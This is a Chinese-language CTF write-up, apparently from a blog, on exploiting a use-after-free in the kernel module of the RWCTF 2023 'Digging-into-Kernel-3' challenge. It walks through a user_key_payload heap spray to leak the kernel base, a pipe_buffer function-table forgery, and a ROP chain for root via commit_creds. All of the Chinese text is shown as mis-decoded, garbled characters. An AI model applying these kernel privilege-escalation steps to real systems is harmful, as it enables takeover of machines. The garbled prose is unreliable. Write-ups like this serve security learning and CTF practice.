<p>ä¸è¿‡æœ¬ç¯‡ä¸ºäº†ä»‹ç»å †å–·å°„è¿™ä¸€æ‰‹æ³•ï¼ŒåŒæ—¶ä¸ºäº†ä½¿ç”¨æ›´å¤šä¸åŒçš„ç»“æ„ä½“ï¼Œ<strong>ç¬”è€…ä¼šç”¨æ¯”è¾ƒå¤æ‚çš„æ€è·¯å»è§£é¢˜</strong></p>
</blockquote>
</blockquote>
<p><a href="/download/rwctf2023/Digging-into-Kernel-3.tar.gz" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">é¢˜ç›®ä¸‹è½½ - Digging-into-Kernel-3.tar.gz</a></p>
<h3 id="â‘ -é¢˜ç›®åˆ†æ-1"><a href="#â‘ -é¢˜ç›®åˆ†æ-1" class="headerlink" title="â‘  é¢˜ç›®åˆ†æ"></a>â‘  é¢˜ç›®åˆ†æ</h3><p>æŒ‰æƒ¯ä¾‹æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œå‘ç°å¼€å¯äº† SMEPã€SMAPã€KASLRã€KPTIï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64 \<br>	-m 128M \<br>	-nographic \<br>	-kernel ./bzImage \<br>	-initrd ./rootfs.img \<br>	-enable-kvm \<br>	-cpu kvm64,+smap,+smep \<br>	-monitor /dev/null \<br>	-append <span class="hljs-string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \<br>	-no-reboot \<br>	-snapshot \<br>	-s<br></code></pre></td></tr></table></figure>

<p>æ–‡ä»¶ç³»ç»Ÿé‡Œç»™äº†ä¸€ä¸ª <code>rwctf.ko</code> ï¼Œæ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå‘ç°åªå®šä¹‰äº†ä¸€ä¸ª ioctlï¼Œæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼š</p>
<ul>
<li>0xDEADBEEFï¼šåˆ†é…ä¸€ä¸ª<strong>ä»»æ„å¤§å°</strong>çš„ object å¹¶èƒ½å†™å…¥æ•°æ®ï¼Œåˆ†é… flag ä¸º <code>__GFP_ZERO | GFP_KERNEL</code>ï¼Œä¸è¿‡æˆ‘ä»¬åªèƒ½åŒæ—¶æœ‰ä¸¤ä¸ª object</li>
<li>0xC0DECAFEï¼šé‡Šæ”¾ä¸€ä¸ªä¹‹å‰åˆ†é…çš„ object ï¼Œ<strong>å­˜åœ¨ UAF</strong></li>
</ul>
<p><img src="https://s2.loli.net/2023/02/07/LRZC2kTujnWsIoX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬éœ€è¦ä¼ å…¥å¦‚ä¸‹ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>ç»è¿‡ç¬”è€…æµ‹è¯•ï¼Œå‡ºé¢˜äºº<strong>æ‰‹åŠ¨å…³é—­äº†å¦‚ä¸‹é»˜è®¤å¼€å¯çš„ä¿æŠ¤</strong>ï¼ˆå‡ºé¢˜äººä¸ºäº†é™ä½é¢˜ç›®éš¾åº¦ï¼Œå¯èƒ½å…³çš„æ›´å¤šï¼Œç¬”è€…åªæµ‹äº†è¿™å‡ ä¸ªï¼‰ï¼š</p>
<ul>
<li>å…³é—­äº† <code>CONFIG_MEMCG_KMEM</code>ï¼Œè¿™ä½¿å¾—<code>GFP_KERNEL</code> ä¸ <code>GFP_KERNEL_ACCOUNT</code> ä¼šä»åŒæ ·çš„ <code>kmalloc-xx</code> ä¸­è¿›è¡Œåˆ†é…</li>
<li>å…³é—­äº† <code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>ï¼Œè¿™ä½¿å¾—å›ºå®šå‡½æ•°è°ƒç”¨åˆ°å†…æ ¸æ ˆåº•çš„åç§»å€¼æ˜¯ä¸å˜çš„</li>
<li>å…³é—­äº† <code>SLAB_FREELIST_HARDENED</code>ï¼Œè¿™ä½¿å¾— freelist å‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“å®Œæˆä»»æ„åœ°å€åˆ†é… + ä»»æ„åœ°å€è¯»å†™</li>
</ul>
<blockquote>
<p><del>ä½†æ˜¯ç°åœ¨éƒ½ 3202 å¹´äº†ï¼Œå‡ºè¿™ç§å’Œå»å¹´å‡ ä¹ä¸€æ ·çš„å…¥é—¨çº§ç™½ç»™é¢˜æœ‰æ„æ€ğŸ</del>ï¼ˆâ†è¯´è¿™å¥è¯çš„äººå·²ç»è¢«ä¹±æ‹³æ‰“æ­»äº†</p>
</blockquote>
<h3 id="â‘¡-æ¼æ´åˆ©ç”¨-1"><a href="#â‘¡-æ¼æ´åˆ©ç”¨-1" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨"></a>â‘¡ æ¼æ´åˆ©ç”¨</h3><p>æ—¢ç„¶é¢˜ç›®ä¸­å·²ç»ç›´æ¥ç™½ç»™å‡ºäº†ä¸€ä¸ªæ— é™åˆ¶çš„ UAFï¼Œé‚£ä¹ˆåˆ©ç”¨æ–¹å¼å°±æ˜¯å¤šç§å¤šæ ·çš„äº† :-D </p>
<h4 id="Step-I-å †å–·-user-key-payload-è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åŸºåœ°å€"><a href="#Step-I-å †å–·-user-key-payload-è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åŸºåœ°å€" class="headerlink" title="Step.I - å †å–· user_key_payload è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åŸºåœ°å€"></a>Step.I - å †å–· user_key_payload è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åŸºåœ°å€</h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆæ³„éœ²å†…æ ¸åŸºå€ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">user_key_payload</a> æ¥å®Œæˆåˆ©ç”¨ï¼šï¼‰</p>
<p>åœ¨å†…æ ¸å½“ä¸­å­˜åœ¨ä¸€ä¸ªç”¨äºå¯†é’¥ç®¡ç†çš„å­ç³»ç»Ÿï¼Œå†…æ ¸æä¾›äº† <code>add_key()</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥çš„åˆ›å»ºï¼Œå¹¶æä¾›äº† <code>keyctl()</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥çš„è¯»å–ã€æ›´æ–°ã€é”€æ¯ç­‰åŠŸèƒ½</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br>        <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;keyutils.h&gt;</span></span><br><br>        <span class="hljs-type">key_serial_t</span> <span class="hljs-title function_">add_key</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *type, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *description,</span><br><span class="hljs-params">                                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload, <span class="hljs-type">size_t</span> plen,</span><br><span class="hljs-params">                                    <span class="hljs-type">key_serial_t</span> keyring)</span>;<br><span class="hljs-comment">//...</span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/unistd.h&gt;</span></span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-type">long</span> <span class="hljs-title function_">syscall</span><span class="hljs-params">(__NR_keyctl, <span class="hljs-type">int</span> operation, <span class="hljs-type">__kernel_ulong_t</span> arg2,</span><br><span class="hljs-params">                    <span class="hljs-type">__kernel_ulong_t</span> arg3, <span class="hljs-type">__kernel_ulong_t</span> arg4,</span><br><span class="hljs-params">                    <span class="hljs-type">__kernel_ulong_t</span> arg5)</span>;<br><br></code></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬è°ƒç”¨ <code>add_key()</code> åˆ†é…ä¸€ä¸ªå¸¦æœ‰ <code>description</code> å­—ç¬¦ä¸²çš„ã€ç±»å‹ä¸º <code>&quot;user&quot;</code> çš„ã€é•¿åº¦ä¸º <code>plen</code> çš„å†…å®¹ä¸º <code>payload</code> çš„å¯†é’¥æ—¶ï¼Œå†…æ ¸ä¼šç»å†å¦‚ä¸‹è¿‡ç¨‹ï¼š</p>
<ul>
<li>é¦–å…ˆä¼šåœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é… obj 1 ä¸ obj2ï¼Œåˆ†é… flag ä¸º <code>GFP_KERNEL</code>ï¼Œç”¨ä»¥ä¿å­˜ <code>description</code> ï¼ˆå­—ç¬¦ä¸²ï¼Œæœ€å¤§å¤§å°ä¸º 4096ï¼‰ã€<code>payload</code> ï¼ˆæ™®é€šæ•°æ®ï¼Œå¤§å°æ— é™åˆ¶ï¼‰</li>
<li>åˆ†é… obj3 ä¿å­˜ <code>description</code> ï¼Œåˆ†é… obj4 ä¿å­˜ <code>payload</code>ï¼Œåˆ†é… flag çš†ä¸º <code>GFP_KERNEL</code></li>
<li>é‡Šæ”¾ obj1 ä¸ obj2ï¼Œè¿”å›å¯†é’¥ id</li>
</ul>
<p>å…¶ä¸­ obj4 ä¸ºä¸€ä¸ª <code>user_key_payload</code> ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span>	<span class="hljs-title">rcu</span>;</span>		<span class="hljs-comment">/* RCU destructor */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>	datalen;	<span class="hljs-comment">/* length of this data */</span><br>	<span class="hljs-type">char</span>		data[] __aligned(__alignof__(u64)); <span class="hljs-comment">/* actual data */</span><br>&#125;;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span> *<span class="hljs-title">next</span>;</span><br>	<span class="hljs-type">void</span> (*func)(<span class="hljs-keyword">struct</span> callback_head *head);<br>&#125; __attribute__((aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *))));<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_head callback_head</span><br></code></pre></td></tr></table></figure>

<p>ç±»ä¼¼äº <code>msg_msg</code>ï¼Œ<code>user_key_payload</code> ç»“æ„ä½“æœ‰ç€ä¸€ä¸ªå›ºå®šå¤§å°çš„å¤´éƒ¨ï¼Œå…¶ä½™ç©ºé—´ç”¨æ¥å­˜å‚¨æ¥è‡ªç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼ˆå¯†é’¥å†…å®¹ï¼‰</p>
<p> <code>keyctl()</code> ç³»ç»Ÿè°ƒç”¨ä¸ºæˆ‘ä»¬æä¾›äº†è¯»å–ã€æ›´æ–°ï¼ˆåˆ†é…æ–°å¯¹è±¡ï¼Œé‡Šæ”¾æ—§å¯¹è±¡ï¼‰ã€é”€æ¯å¯†é’¥ï¼ˆé‡Šæ”¾ payloadï¼‰çš„åŠŸèƒ½ï¼Œå…¶ä¸­è¯»å–çš„æœ€å¤§é•¿åº¦ç”± <code>user_key_payload-&gt;datalen</code>  å†³å®šï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®æä¾›çš„ UAF å°†<code>user_key_payload-&gt;datalen</code> æ”¹å¤§ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»</p>
<p>æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p>
<ul>
<li>è¿™é‡Œæˆ‘ä»¬çš„ description å­—ç¬¦ä¸²éœ€è¦å’Œ payload æœ‰ç€ä¸åŒçš„é•¿åº¦ï¼Œä»è€Œç®€åŒ–åˆ©ç”¨æ¨¡å‹</li>
<li>è¯»å– key æ—¶çš„ len åº”å½“<strong>ä¸å°äº user_key_payload-&gt;datalenï¼Œå¦åˆ™ä¼šè¯»å–å¤±è´¥</strong></li>
</ul>
<p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼š<strong>add_key() ä¼šå…ˆåˆ†é…ä¸€ä¸ªä¸´æ—¶çš„ obj1 æ‹·è´ payload åå†åˆ†é…ä¸€ä¸ª obj2 ä½œä¸º user_key_payload</strong>ï¼Œè‹¥æˆ‘ä»¬å…ˆåˆ†é…ä¸€ä¸ª obj å¹¶é‡Šæ”¾åå†è°ƒç”¨ add_key() åˆ™è¯¥ obj ä¸ä¼šç›´æ¥æˆä¸º <code>user_key_payload</code> ï¼Œè€Œæ˜¯ä¼šåœ¨åç»­çš„æ•°æ¬¡åˆ†é…ä¸­éƒ½ä½œä¸ºæ‹·è´ payload çš„ä¸´æ—¶ obj å­˜åœ¨</p>
<p><strong>ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å †å–·å°† UAF obj åˆ†é…åˆ° user_key_payload</strong>ï¼Œè€ƒè™‘å¦‚ä¸‹æµç¨‹ï¼š</p>
<ul>
<li>åˆ©ç”¨é¢˜ç›®åŠŸèƒ½æ„å»º UAF object</li>
<li>å †å–·å°„ <code>user_key_payload</code> ï¼ŒUAF obj ä½œä¸ºæ‹·è´ payload çš„ä¸´æ—¶ obj å­˜åœ¨</li>
<li><code>kmem_cache_cpu</code> çš„ slub page è€—å…‰ï¼Œå‘ node è¯·æ±‚æ–°çš„ slub page åˆ†é…  <code>user_key_payload</code> ï¼Œå®Œæˆå UAF obj è¢«é‡Šæ”¾å¹¶å›åˆ° <code>kmem_cache_node</code></li>
<li>ç»§ç»­å †å–· <code>user_key_payload</code> ï¼Œ<code>kmem_cache_cpu</code> çš„ slub page è€—å…‰ï¼Œå‘ node è¯·æ±‚æ–°çš„ slub page åˆ†é…  <code>user_key_payload</code> </li>
<li>UAF obj æ‰€åœ¨é¡µé¢è¢«å–å›ï¼ŒUAF obj è¢«åˆ†é…ä¸º  <code>user_key_payload</code> </li>
<li>åˆ©ç”¨é¢˜ç›®åŠŸèƒ½å†æ¬¡é‡Šæ”¾ UAF objï¼Œåˆ©ç”¨é¢˜ç›®åŠŸèƒ½è¿›è¡Œå †å–·è·å–åˆ°è¯¥ objï¼Œä»è€Œè¦†å†™ <code>user_key_payload</code></li>
</ul>
<blockquote>
<p>æ³¨ï¼šå®˜æ–¹é¢˜è§£ä¸­è¿›è¡Œåœ°å€æ³„éœ²ä¹Ÿæ˜¯åˆ©ç”¨ç±»ä¼¼çš„åšæ³•</p>
<blockquote>
<p>ä¸è¿‡ç¬”è€…è§‰å¾—å…¶å®ç›´æ¥åˆ©ç”¨é¢˜ç›®åˆ†é… obj1 å’Œ obj2 åå…¨éƒ¨é‡Šæ”¾ï¼Œä¹‹åå†åœ¨ obj2 ä¸Šå¼„ UAF å°±è¡Œäº†ï¼š) è¿™é‡Œé‡‡ç”¨è¿™ç§åšæ³•åªæ˜¯ä¸ºäº†ä»‹ç» heap spraying è¿™ä¸€æ‰‹æ³•</p>
<blockquote>
<p>ç¬”è€…å°†åœ¨ Step.II ä¸­ä½¿ç”¨è¿™ç§æ–¹æ³•</p>
</blockquote>
</blockquote>
</blockquote>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘è¶Šç•Œè¯»å–ä»€ä¹ˆæ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åˆ†é…å…¶ä»–çš„ç»“æ„ä½“ï¼Œ <code>rcu_head-&gt;func</code> <strong>å‡½æ•°æŒ‡é’ˆåœ¨ rcu å¯¹è±¡è¢«é‡Šæ”¾åæ‰ä¼šè¢«å†™å…¥å¹¶è°ƒç”¨ï¼Œä½†è°ƒç”¨å®Œå¹¶ä¸ä¼šå°†å…¶ç½®ä¸º NULL</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡Šæ”¾å¯†é’¥çš„æ–¹å¼åœ¨å†…æ ¸å †ä¸Šç•™ä¸‹å†…æ ¸å‡½æ•°æŒ‡é’ˆï¼Œä»è€Œå®Œæˆå†…æ ¸åŸºå€çš„æ³„éœ²</p>
<h4 id="Step-II-UAF-æ³„éœ²å¯æ§å †å¯¹è±¡åœ°å€ï¼Œç¯¡æ”¹-pipe-buffer-åŠ«æŒæ§åˆ¶æµ"><a href="#Step-II-UAF-æ³„éœ²å¯æ§å †å¯¹è±¡åœ°å€ï¼Œç¯¡æ”¹-pipe-buffer-åŠ«æŒæ§åˆ¶æµ" class="headerlink" title="Step.II - UAF æ³„éœ²å¯æ§å †å¯¹è±¡åœ°å€ï¼Œç¯¡æ”¹ pipe_buffer åŠ«æŒæ§åˆ¶æµ"></a>Step.II - UAF æ³„éœ²å¯æ§å †å¯¹è±¡åœ°å€ï¼Œç¯¡æ”¹ pipe_buffer åŠ«æŒæ§åˆ¶æµ</h4><p>å¯ä»¥ç”¨æ¥æ§åˆ¶å†…æ ¸æ‰§è¡Œæµçš„ç»“æ„ä½“æœ‰å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è€ƒè™‘å¦‚ä½•å®Œæ•´åœ°æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(NULL))</code> åå†æˆåŠŸè¿”å›ç”¨æˆ·æ€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œæ ˆè¿ç§»ä»¥å¸ƒç½®è¾ƒä¸ºå®Œæ•´çš„ ROP gadget chain</p>
<blockquote>
<p>ä»€ä¹ˆï¼Ÿä½ é—®ä¸ºä»€ä¹ˆä¸ç”¨ <code>pt_regs</code> ï¼Ÿå› ä¸ºè¿™ä¸ªæ‰‹æ³•ç¬”è€…æ‰“ç®—åœ¨åé¢æ‰è®²ï¼ˆç¬‘ï¼‰</p>
<blockquote>
<p>ä»¥åŠåœ¨é»˜è®¤å¼€å¯ <code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code> çš„æ–°ç‰ˆæœ¬å†…æ ¸å½“ä¸­è¿™å·²ç»æ˜¯æ—¶æ³ªäº†ï¼ˆæ‚²ï¼‰</p>
</blockquote>
</blockquote>
<p>ç”±äºé¢˜ç›®å¼€å¯äº† SMEPã€SMAP ä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½åœ¨å†…æ ¸ç©ºé—´ä¼ªé€ å‡½æ•°è¡¨ï¼ŒåŒæ—¶å†…æ ¸ä¸­çš„å¤§éƒ¨åˆ†ç»“æ„ä½“çš„å‡½æ•°è¡¨ä¸ºé™æ€æŒ‡å®šï¼ˆä¾‹å¦‚ <code>tty-&gt;ops</code> æ€»æ˜¯ <code>ptmï¼ˆæˆ–ptyï¼‰_unix98_ops</code>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ä¸€ä¸ªå†…å®¹å¯æ§çš„å†…æ ¸å¯¹è±¡çš„åœ°å€ï¼Œä»è€Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼ªé€ å‡½æ•°è¡¨</p>
<p>è¿™é‡Œç¬”è€…é€‰æ‹©ç®¡é“ç›¸å…³çš„ç»“æ„ä½“å®Œæˆåˆ©ç”¨ï¼›åœ¨å†…æ ¸ä¸­ï¼Œç®¡é“æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<strong>è™šæ‹Ÿçš„ inode</strong> æ¥è¡¨ç¤ºçš„ï¼Œå¯¹åº”çš„å°±æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>åŒæ—¶å†…æ ¸ä¸­ä¼šåˆ†é…ä¸€ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“å¯¹åº”ä¸€å¼ ç”¨ä»¥å­˜å‚¨æ•°æ®çš„å†…å­˜é¡µï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>pipe_buf_operations</code> ä¸ºä¸€å¼ å‡½æ•°è¡¨ï¼Œå½“æˆ‘ä»¬å¯¹ç®¡é“è¿›è¡Œç‰¹å®šæ“ä½œæ—¶å†…æ ¸ä¾¿ä¼šè°ƒç”¨è¯¥è¡¨ä¸Šå¯¹åº”çš„å‡½æ•°ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµï¼Œä»è€Œå®Œæˆææƒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>	<span class="hljs-comment">//...</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment">	 * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ UAF ä½¿å¾— <code>user_key_payload</code> ä¸ <code>pipe_inode_info</code> å æ®åŒä¸€ä¸ª objectï¼Œ <code>pipe_inode_info</code> åˆšå¥½ä¼šå°† <code>user_key_payload-&gt;datalen</code> æ”¹ä¸º <code>0xFFFF</code> ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿç»§ç»­è¯»å–æ•°æ®ï¼Œä»è€Œè¯»å– <code>pipe_inode_info</code>  ä»¥æ³„éœ²å‡º <code>pipe_buffer</code> çš„åœ°å€</p>
<p>è€Œ  <code>pipe_buffer</code> æ˜¯åŠ¨æ€åˆ†é…çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®åŠŸèƒ½é¢„å…ˆåˆ†é…ä¸€ä¸ªå¯¹è±¡ä½œä¸º <code>pipe_buffer</code> å¹¶ç›´æ¥åœ¨å…¶ä¸Šä¼ªé€ å‡½æ•°è¡¨å³å¯</p>
<blockquote>
<p>å¯¹äºç¬”è€…æ¥è¯´æ¯”è¾ƒéº»çƒ¦çš„å€’æ˜¯æ‰¾æ ˆè¿ç§»çš„ gadgetâ€¦å¥½åœ¨æœ€åè¿˜æ˜¯æˆåŠŸæ‰¾åˆ°äº†ä¸€äº›åˆé€‚çš„ gadget</p>
</blockquote>
